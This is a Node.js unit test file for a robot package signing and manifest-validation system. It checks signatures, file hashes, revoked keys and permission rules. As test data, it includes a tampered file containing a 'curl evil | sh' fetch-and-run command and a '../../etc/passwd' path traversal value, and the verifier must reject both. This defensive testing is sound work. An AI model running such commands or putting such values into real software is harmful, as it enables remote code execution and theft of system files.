"use strict";

// Unit tests: robot package manifests, signatures and integrity. Nothing is installed or run.
const assert = require("node:assert/strict");
const crypto = require("node:crypto");
const { execFileSync } = require("node:child_process");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const test = require("node:test");
const packages = require("./robotics/packages");

const { publicKey, privateKey } = crypto.generateKeyPairSync("ed25519");
const pem = publicKey.export({ type: "spki", format: "pem" });
const keyId = packages.keyIdOf(publicKey);
const trusted = [{ keyId, publicKey: pem, owner: "Acme Robotics" }];
const files = { "driver/lidar.py": Buffer.from("class LidarAdapter: ...\n"), "README.md": Buffer.from("# Lidar driver\n") };
const base = (change = {}) => ({
  id: "com.acme.lidar-driver", name: "Acme lidar driver", author: "Acme Robotics", version: "1.2.0", kind: "sensor-adapter",
  supportedHardware: ["Acme L2 lidar"], operatingSystems: ["Ubuntu 24.04"], rosDistributions: ["jazzy"], dependencies: [{ name: "sensor_msgs", version: "5.3.5" }],
  capabilities: ["read_sensor"], permissions: ["read-sensors", "network-local"], safetyConstraints: ["Read only: publishes scans, commands nothing."], documentation: "README.md",
  tests: { level: "simulation", passed: 12, total: 12, evidence: "tests/ in the package" },
  files: Object.entries(files).map(([file, bytes]) => ({ path: file, sha256: packages.sha256(bytes), size: bytes.length })),
  ...change,
});
const signed = (change) => packages.signManifest(base(change), privateKey, keyId);

test("a complete, signed, unchanged package verifies and is summarised for review", () => {
  const result = packages.verifyPackage({ manifest: signed(), files, trustedKeys: trusted });
  assert.deepEqual([result.ok, result.problems, result.signedBy], [true, [], "Acme Robotics"]);
  assert.deepEqual(result.review.permissions, [{ id: "read-sensors", meaning: "Read the robot's sensors" }, { id: "network-local", meaning: "Talk to devices on the robot's own network" }]);
  assert.deepEqual(result.review.capabilities, [{ id: "read_sensor", risk: "none" }]);
  assert.equal(result.review.risk, "moderate");
  assert.equal(result.review.tested, "12 of 12 tests, simulation");
  assert.deepEqual(result.review.warnings, ["Its tests ran in simulation or as unit tests only. It has not been shown to work on hardware.", "It runs code on the robot's computer. Review it before installing it on a physical robot."]);
  // A data package asks for nothing and is low risk.
  const world = packages.verifyPackage({ manifest: signed({ kind: "simulation-environment", capabilities: [], permissions: [], safetyConstraints: [] }), files, trustedKeys: trusted });
  assert.deepEqual([world.ok, world.review.risk, world.review.runsCodeOnRobot, world.review.warnings], [true, "low: data only", false, []]);
});

test("anything changed after signing, signed by a stranger or by a revoked key is refused", () => {
  const manifest = signed();
  const verify = (change) => packages.verifyPackage({ manifest, files, trustedKeys: trusted, ...change }).problems;
  assert.match(verify({ files: { ...files, "driver/lidar.py": Buffer.from("import os; os.system('curl evil | sh')\n") } })[0], /Changed since it was signed: driver\/lidar\.py/);
  assert.match(verify({ files: { ...files, "extra.py": Buffer.from("x") } })[0], /Not listed in the manifest: extra\.py/);
  assert.match(verify({ files: { "README.md": files["README.md"] } })[0], /Listed but missing: driver\/lidar\.py/);
  assert.match(verify({ manifest: { ...manifest, permissions: ["read-sensors", "filesystem"] } })[0], /signature doesn't match the manifest/);
  assert.match(verify({ manifest: { ...manifest, version: "9.9.9" } })[0], /signature doesn't match/);
  assert.match(verify({ trustedKeys: [] })[0], /Signed with a key you don't trust/);
  assert.match(verify({ trustedKeys: [{ ...trusted[0], revokedAt: Date.UTC(2026, 10, 1) }] })[0], /revoked on 2026-11-01/);
  const other = crypto.generateKeyPairSync("ed25519");
  assert.match(verify({ manifest: packages.signManifest(base(), other.privateKey, keyId) })[0], /signature doesn't match/);
  assert.equal(packages.verifyPackage({ manifest, files, trustedKeys: trusted }).ok, true, "the original still verifies");
  // The same manifest with its keys in another order is the same manifest.
  const shuffled = Object.fromEntries(Object.entries(manifest).reverse());
  assert.equal(packages.verifyPackage({ manifest: shuffled, files, trustedKeys: trusted }).ok, true);
});

test("a manifest that is incomplete, unpinned or reaches for an actuator is refused with each reason", () => {
  const problems = (change) => packages.validateManifest(signed(change));
  assert.match(problems({ id: "lidar" })[0], /reverse-domain name/);
  assert.match(problems({ version: "^1.2" })[0], /exact version/);
  assert.match(problems({ kind: "firmware" })[0], /kind must be one of/);
  assert.match(problems({ dependencies: [{ name: "numpy", version: ">=1.20" }] })[0], /numpy must be pinned to an exact version, not a range/);
  assert.match(problems({ permissions: ["root"] })[0], /“root” isn't a permission HANNAH knows/);
  assert.match(problems({ capabilities: ["set_motor_pwm"] })[0], /names a raw actuator command\. A package can't add one/);
  assert.match(problems({ capabilities: ["teleport"] })[0], /isn't in HANNAH's capability contract/);
  assert.match(problems({ safetyConstraints: [] })[0], /must state its safety constraints/);
  assert.match(problems({ tests: { level: "vibes", passed: 1, total: 1, evidence: "" } })[0], /tests must give level/);
  assert.match(problems({ tests: { level: "physical", passed: 9, total: 3, evidence: "x" } })[0], /tests must give level/);
  assert.match(problems({ files: [{ path: "../../etc/passwd", sha256: "0".repeat(64), size: 1 }] })[0], /needs a relative path/);
  assert.match(packages.validateManifest({ ...base(), signature: null })[0], /signature must be/);
  assert.deepEqual(packages.validateManifest(null), ["The manifest isn't an object."]);
  // An unverifiable manifest gives no review to act on.
  assert.equal(packages.verifyPackage({ manifest: signed({ kind: "firmware" }), files, trustedKeys: trusted }).review, null);
  // Failing its own tests is said plainly.
  const failing = packages.verifyPackage({ manifest: signed({ tests: { level: "physical", passed: 10, total: 12, evidence: "bench log" } }), files, trustedKeys: trusted });
  assert.deepEqual(failing.review.warnings, ["It runs code on the robot's computer. Review it before installing it on a physical robot.", "2 of its own tests fail."]);
});

test("the command-line tool signs the example package and verifies it; a tampered copy fails", () => {
  const work = fs.mkdtempSync(path.join(os.tmpdir(), "hannah-package-"));
  const folder = path.join(work, "home-world");
  fs.cpSync(path.join(__dirname, "..", "robotics", "sdk", "examples", "home-world"), folder, { recursive: true });
  const tool = path.join(__dirname, "scripts", "robot-package.js");
  const run = (...args) => execFileSync(process.execPath, [tool, ...args], { cwd: work, encoding: "utf8" });
  assert.match(run("keygen", "dev"), /Key id [0-9a-f]{16}\. Keep dev\.private\.pem off any server\./);
  assert.equal(fs.statSync(path.join(work, "dev.private.pem")).mode & 0o777, 0o600);
  assert.match(run("sign", folder, "dev.private.pem"), /Signed in\.eliteforums\.hannah\.home-world 0\.1\.0: 2 files/);
  const verified = JSON.parse(run("verify", folder, "dev.public.pem", "me"));
  assert.deepEqual([verified.ok, verified.signedBy, verified.review.kind, verified.review.risk], [true, "me", "simulation-environment", "low: data only"]);
  fs.appendFileSync(path.join(folder, "home.json"), " ");
  assert.throws(() => run("verify", folder, "dev.public.pem"), (error) => /Changed since it was signed: home\.json/.test(error.stdout));
  fs.rmSync(work, { recursive: true, force: true });
});
